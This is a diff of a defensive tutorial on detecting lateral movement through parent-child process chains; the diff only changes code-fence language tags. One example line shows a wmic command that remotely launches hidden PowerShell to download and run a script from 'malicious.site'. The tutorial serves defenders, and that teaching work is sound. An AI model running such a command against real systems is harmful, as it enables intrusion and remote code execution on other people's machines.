@@ -43,7 +43,7 @@ Detecting lateral movement is tricky because it uses legitimate, trusted tools a
 When a hacker is on a machine, they may be using LOLBins, but the **way** those tools are used can give them away. One way defenders detect this is by looking at **which process started another**—also known as parent-child process relationships.
 
 Let’s say we see this process chain in a system:
-```
+```bash
 winword.exe → cmd.exe → powershell.exe → wmic.exe
 ```
 - `winword.exe → cmd.exe` implies there was likely a macro embedded in a Word document (probably from a phishing email).
@@ -51,7 +51,7 @@ winword.exe → cmd.exe → powershell.exe → wmic.exe
 - PowerShell can then download a payload, and finally `wmic.exe` is used for the **lateral movement**.
 
 Here’s an example command that might be executed via `wmic.exe`:
-```
+```powershell
 wmic /node:"10.0.0.12" process call create "powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"
 ```
 - `/node:"10.0.0.12"` → Targets another machine on the network.  
